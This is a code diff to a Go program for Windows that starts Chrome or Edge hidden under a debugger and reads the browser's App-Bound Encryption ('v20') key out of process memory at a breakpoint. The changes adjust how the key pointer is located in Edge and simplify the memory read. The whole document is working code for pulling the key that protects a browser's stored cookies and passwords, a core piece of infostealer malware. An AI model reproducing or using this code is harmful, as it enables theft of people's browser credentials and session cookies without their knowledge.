@@ -65,7 +65,7 @@ func main() {
 		si.Flags = windows.STARTF_USESHOWWINDOW
 		si.ShowWindow = windows.SW_HIDE
 
-		var pi windows.ProcessInformation // processId from here
+		var pi windows.ProcessInformation
 
 		err = windows.CreateProcess(
 			appName,
@@ -73,7 +73,7 @@ func main() {
 			nil,
 			nil,
 			false,
-			windows.CREATE_SUSPENDED,
+			windows.DEBUG_ONLY_THIS_PROCESS,
 			nil,
 			nil,
 			&si,
@@ -88,7 +88,7 @@ func main() {
 		defer windows.CloseHandle(pi.Process)
 		defer windows.CloseHandle(pi.Thread)
 
-		fmt.Printf("created suspended: pid=%d tid=%d\n", pi.ProcessId, pi.ThreadId)
+		fmt.Printf("created: pid=%d tid=%d\n", pi.ProcessId, pi.ThreadId)
 
 		if strings.Compare(exeFile, msedgeExe) == 0 {
 			err = startDebug(&pi, true)
@@ -105,13 +105,6 @@ func startDebug(pi *windows.ProcessInformation, isEdge bool) error {
 	runtime.LockOSThread()
 	defer runtime.UnlockOSThread()
 
-	if err := DebugActiveProcess(pi.ProcessId); err != nil {
-		return fmt.Errorf("DebugActiveProcess: %w", err)
-	}
-	if _, err := windows.ResumeThread(pi.Thread); err != nil {
-		return fmt.Errorf("ResumeThread: %w", err)
-	}
-
 	var (
 		baseDllAddr uintptr
 		leaAddr     uintptr
@@ -120,7 +113,7 @@ func startDebug(pi *windows.ProcessInformation, isEdge bool) error {
 	fBp := true
 	var debugEvent types.DEBUG_EVENT
 	for {
-		ok, err := WaitForDebugEvent(&debugEvent, windows.INFINITE)
+		ok, err := WaitForDebugEvent(&debugEvent, 9000)
 		if err != nil {
 			return err
 		}
@@ -235,6 +228,9 @@ func dumpAbeKeyFromCtx(hProcess, hThread windows.Handle, isEdge bool) ([]byte, e
 	}
 
 	var keyPtrReg uint64 = context.R15
+	if isEdge {
+		keyPtrReg = context.R15 + 0x20 // for get ptr to key in edge it located at offset 32
+	}
 
 	buf := make([]byte, 16) // r15 byte address
 	var bytesRead uintptr
@@ -250,30 +246,17 @@ func dumpAbeKeyFromCtx(hProcess, hThread windows.Handle, isEdge bool) ([]byte, e
 	buf = buf[:bytesRead]
 	fmt.Printf("%x\n", buf)
 
-	v20Key := make([]byte, 0x40)
-	if isEdge {
-		if err := windows.ReadProcessMemory(
-			hProcess,
-			uintptr(binary.LittleEndian.Uint64(buf)),
-			&v20Key[0],
-			0x20,
-			&bytesRead,
-		); err != nil {
-			return nil, fmt.Errorf("ReadProcessMemory key: %w", err)
-		}
-		v20Key = v20Key[:0x20]
-	} else {
-		if err := windows.ReadProcessMemory(
-			hProcess,
-			uintptr(binary.LittleEndian.Uint64(buf)),
-			&v20Key[0],
-			0x40,
-			&bytesRead,
-		); err != nil {
-			return nil, fmt.Errorf("ReadProcessMemory key: %w", err)
-		}
-		v20Key = v20Key[0x20:]
+	v20Key := make([]byte, 0x20)
+	if err := windows.ReadProcessMemory(
+		hProcess,
+		uintptr(binary.LittleEndian.Uint64(buf)),
+		&v20Key[0],
+		0x20,
+		&bytesRead,
+	); err != nil {
+		return nil, fmt.Errorf("ReadProcessMemory key: %w", err)
 	}
+	v20Key = v20Key[:bytesRead]
 
 	return v20Key, nil
 }
